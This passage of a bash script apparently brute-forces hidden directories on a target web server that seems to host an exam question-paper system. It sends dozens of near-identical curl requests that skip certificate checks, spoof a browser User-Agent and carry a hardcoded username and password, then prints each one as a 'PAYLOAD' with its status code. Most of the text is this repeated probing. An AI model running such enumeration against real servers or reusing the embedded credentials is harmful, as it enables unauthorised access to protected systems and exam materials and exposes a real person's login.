" "${target}DashboardQPCloud/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DashboardQPCloud/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemDataPipeline/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemDataPipeline/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemDataPipeline/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_QPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_QPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_QPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer-QPWorkflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer-QPWorkflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer-QPWorkflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-QPMgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-QPMgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-QPMgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_Portal/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_Portal/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_Portal/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps_QPB/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps_QPB/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps_QPB/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload_QPBatch/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload_QPBatch/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload_QPBatch/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor-QPUploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor-QPUploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor-QPUploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoBatchUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoBatchUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoBatchUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_AutoUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_AutoUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_AutoUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_Management/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_Management/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_Management/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_DataOps/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_DataOps/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_DataOps/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-Tool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-Tool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-Tool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PBulkUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PBulkUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PBulkUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystemQP/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystemQP/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystemQP/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload_QPManager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload_QPManager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload_QPManager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagementQuestionPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagementQuestionPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagementQuestionPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QPCloud/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QPCloud/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QPCloud/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessingQstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessingQstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessingQstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperSuite/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperSuite/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperSuite/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload_QPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload_QPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload_QPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUploadQPSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUploadQPSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUploadQPSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadSuite/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadSuite/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadSuite/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_BatchUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_BatchUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_BatchUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_AutoUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_AutoUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_AutoUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DashboardQPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DashboardQPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DashboardQPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorAutoUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorAutoUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorAutoUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [WorkflowQPaperDoc/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}WorkflowQPaperDoc/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}WorkflowQPaperDoc/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload-QstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload-QstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload-QstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingMassUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingMassUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingMassUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerMonitoringTool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerMonitoringTool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerMonitoringTool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchUploadService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchUploadService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchUploadService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service_QPHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service_QPHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service_QPHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload-QPB/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload-QPB/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload-QPB/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchOps/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchOps/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchOps/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_Mgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_Mgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_Mgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterMgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterMgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterMgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteQPWorkflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteQPWorkflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteQPWorkflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-QPAuto/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-QPAuto/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-QPAuto/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload_QPControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
